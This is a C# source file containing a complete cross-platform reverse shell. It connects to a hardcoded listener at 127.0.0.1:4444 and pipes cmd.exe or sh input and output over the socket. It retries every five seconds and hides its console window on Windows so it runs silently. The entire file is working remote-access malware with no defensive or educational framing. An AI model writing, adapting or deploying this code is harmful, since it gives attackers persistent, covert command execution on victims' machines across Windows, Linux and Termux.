using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class MultiPlatformShell {
    private static string ip = "127.0.0.1";
    private static int port = 4444;

    static void Main() {
        while (true) {
            try {
                RunShell();
            } catch {
                Thread.Sleep(5000);
            }
        }
    }

    static void RunShell() {
        using (TcpClient client = new TcpClient(ip, port)) {
            using (Stream stream = client.GetStream()) {
                using (StreamReader reader = new StreamReader(stream)) {
                    using (StreamWriter writer = new StreamWriter(stream)) {
                        writer.AutoFlush = true;

                        Process p = new Process();
                        
                        // Dynamic runtime discovery hooks the platform-specific shell binary
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
                            p.StartInfo.FileName = "cmd.exe";
                        } else {
                            // Standardizes across desktop Linux distributions and Termux environments
                            p.StartInfo.FileName = "sh"; 
                        }

                        // Detaches process standard input/output vectors to execute silently
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true; // Removes black console frame on Windows execution

                        // Asynchronous streaming pipeline hooks shell output back to network sockets
                        p.OutputDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
                        p.ErrorDataReceived  += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };

                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        // Intercepts network strings and updates process standard input
                        string line;
                        while ((line = reader.ReadLine()) != null) {
                            if (line.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase)) {
                                p.Kill();
                                return;
                            }
                            p.StandardInput.WriteLine(line);
                        }
                    }
                }
            }
        }
    }
}
